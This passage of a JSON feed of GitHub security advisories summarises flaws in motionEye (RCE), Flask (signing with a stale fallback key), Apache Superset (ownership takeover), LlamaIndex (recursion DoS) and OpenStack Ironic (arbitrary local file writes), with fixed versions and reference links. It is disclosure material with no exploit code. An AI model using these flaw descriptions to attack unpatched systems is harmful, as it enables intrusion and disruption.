href=\"https://patch-diff.githubusercontent.com/raw/motioneye-project/motioneye/pull/3143.patch\">https://patch-diff.githubusercontent.com/raw/motioneye-project/motioneye/pull/3143.patch</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/motioneye-project/motioneye/issues/3142\">https://github.com/motioneye-project/motioneye/issues/3142</a></p>\n<h3 id=\"credit\">Credit</h3>\n<p>The vulnerability was discovered by Tencent YunDing Security Lab.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g5mq-prx7-c588\">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g5mq-prx7-c588</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47782\">https://nvd.nist.gov/vuln/detail/CVE-2025-47782</a></li>\n<li><a href=\"https://github.com/motioneye-project/motioneye/issues/3142\">https://github.com/motioneye-project/motioneye/issues/3142</a></li>\n<li><a href=\"https://github.com/motioneye-project/motioneye/pull/3143\">https://github.com/motioneye-project/motioneye/pull/3143</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/motioneye/PYSEC-2025-39.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/motioneye/PYSEC-2025-39.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5mq-prx7-c588\">https://github.com/advisories/GHSA-g5mq-prx7-c588</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5mq-prx7-c588",
            "title": "[motioneye] motionEye vulnerable to RCE in add_camera Function Due to unsafe command execution",
            "date_modified": "2025-05-15T16:10:51.000Z",
            "date_published": "2025-05-15T16:10:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5mq-prx7-c588"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Flask 3.1.0, the way fallback key configuration was handled resulted in the last fallback key being used for signing, rather than the current signing key.</p>\n<p>Signing is provided by the <code>itsdangerous</code> library. A list of keys can be passed, and it expects the last (top) key in the list to be the most recent key, and uses that for signing. Flask was incorrectly constructing that list in reverse, passing the signing key first.</p>\n<p>Sites that have opted-in to use key rotation by setting <code>SECRET_KEY_FALLBACKS</code> are likely to unexpectedly be signing their sessions with stale keys, and their transition to fresher keys will be impeded. Sessions are still signed, so this would not cause any sort of data integrity loss.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pallets/flask/security/advisories/GHSA-4grg-w6v8-c28g\">https://github.com/pallets/flask/security/advisories/GHSA-4grg-w6v8-c28g</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47278\">https://nvd.nist.gov/vuln/detail/CVE-2025-47278</a></li>\n<li><a href=\"https://github.com/pallets/flask/commit/73d6504063bfa00666a92b07a28aaf906c532f09\">https://github.com/pallets/flask/commit/73d6504063bfa00666a92b07a28aaf906c532f09</a></li>\n<li><a href=\"https://github.com/pallets/flask/releases/tag/3.1.1\">https://github.com/pallets/flask/releases/tag/3.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4grg-w6v8-c28g\">https://github.com/advisories/GHSA-4grg-w6v8-c28g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4grg-w6v8-c28g",
            "title": "[flask] Flask uses fallback key instead of current signing key",
            "date_modified": "2025-05-13T20:25:26.000Z",
            "date_published": "2025-05-13T20:25:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4grg-w6v8-c28g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper Authorization vulnerability in Apache Superset allows ownership takeover of dashboards, charts or datasets by authenticated users with read permissions.</p>\n<p>This issue affects Apache Superset: through 4.1.1.</p>\n<p>Users are recommended to upgrade to version 4.1.2 or above, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27696\">https://nvd.nist.gov/vuln/detail/CVE-2025-27696</a></li>\n<li><a href=\"https://lists.apache.org/thread/k2od03bxnxs6vcp80sr03ywcxl194413\">https://lists.apache.org/thread/k2od03bxnxs6vcp80sr03ywcxl194413</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/05/12/3\">http://www.openwall.com/lists/oss-security/2025/05/12/3</a></li>\n<li><a href=\"https://github.com/apache/superset/commit/fc844d3dfdace890b32c00a507a959b81122b425\">https://github.com/apache/superset/commit/fc844d3dfdace890b32c00a507a959b81122b425</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w6c7-j32f-rq8j\">https://github.com/advisories/GHSA-w6c7-j32f-rq8j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w6c7-j32f-rq8j",
            "title": "[apache-superset] Apache Superset Allows Ownership Takeover",
            "date_modified": "2025-05-13T20:23:45.000Z",
            "date_published": "2025-05-13T09:31:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w6c7-j32f-rq8j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Denial of Service (DoS) vulnerability has been identified in the KnowledgeBaseWebReader class of the run-llama/llama_index project, affecting version ~ latest(v0.12.15). The vulnerability arises due to inappropriate secure coding measures, specifically the lack of proper implementation of the max_depth parameter in the get_article_urls function. This allows an attacker to exhaust Python's recursion limit through repeated function calls, leading to resource consumption and ultimately crashing the Python process.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1752\">https://nvd.nist.gov/vuln/detail/CVE-2025-1752</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/3c65db2947271de3bd1927dc66a044da385de4da\">https://github.com/run-llama/llama_index/commit/3c65db2947271de3bd1927dc66a044da385de4da</a></li>\n<li><a href=\"https://huntr.com/bounties/cd7b9082-7d75-42e4-84f5-dbee23cbc467\">https://huntr.com/bounties/cd7b9082-7d75-42e4-84f5-dbee23cbc467</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7c85-87cp-mr6g\">https://github.com/advisories/GHSA-7c85-87cp-mr6g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7c85-87cp-mr6g",
            "title": "[llama-index] LlamaIndex Vulnerable to Denial of Service (DoS)",
            "date_modified": "2025-05-12T20:16:20.000Z",
            "date_published": "2025-05-10T15:30:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7c85-87cp-mr6g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Ironic before 29.0.1 can write unintended files to a target node disk during image handling (if a deployment was performed via the API). A malicious project assigned as a node owner can provide a path to any local file (readable by ironic-conductor), which may then be written to the target node disk. This is difficult to exploit in practice, because a node deployed in this manner should never reach the ACTIVE state, but it still represents a danger in environments running with non-default, insecure configurations such as with automated cleaning disabled. The fixed versions are 24.1.3, 26.1.1, and 29.0.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-44021\">https://nvd.nist.gov/vuln/detail/CVE-2025-44021</a></li>\n<li><a href=\"https://bugs.launchpad.net/ironic/+bug/2107847\">https://bugs.launchpad.net/ironic/+bug/2107847</a></li>\n<li><a href=\"https://security.openstack.org/ossa/OSSA-2025-001.html\">https://security.openstack.org/ossa/OSSA-2025-001.html</a></li>\n<li><a href=\"https://github.com/openstack/ironic/commit/10590b36f541130f6a5d7a49da0f095ff8390cce\">https://github.com/openstack/ironic/commit/10590b36f541130f6a5d7a49da0f095ff8390cce</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/ironic/PYSEC-2025-38.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/ironic/PYSEC-2025-38.yaml</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/05/08/1\">http://www.openwall.com/lists/oss-security/2025/05/08/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q3m2-crgq-5p3q\">https://github.com/advisories/GHSA-q3m2-crgq-5p3q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q3m2-crgq-5p3q",
            "title": "[ironic] OpenStack Ironic fails to restrict paths used for file:// image URLs",
            "date_modified": "2025-05-08T22:07:16.000Z",
            "date_published": "2025-05-08T18:30:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q3m2-crgq-5p3q"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}